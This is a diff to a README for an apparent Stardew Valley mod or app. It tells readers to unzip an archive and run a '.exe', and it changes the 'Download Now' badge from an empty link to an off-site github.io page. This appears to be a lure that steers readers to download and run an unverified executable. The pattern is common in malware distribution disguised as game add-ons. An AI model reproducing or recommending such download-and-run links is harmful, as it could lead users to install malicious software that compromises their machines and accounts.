@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://stardew-valley-a-world-of-dew.github.io/.github/)
 
 ## 📸 Overview
 <img width="641" height="383" alt="sve-dew-aesthetics" src="https://github.com/user-attachments/assets/f49da90e-ee1c-459e-bb4d-965889648c1f" />
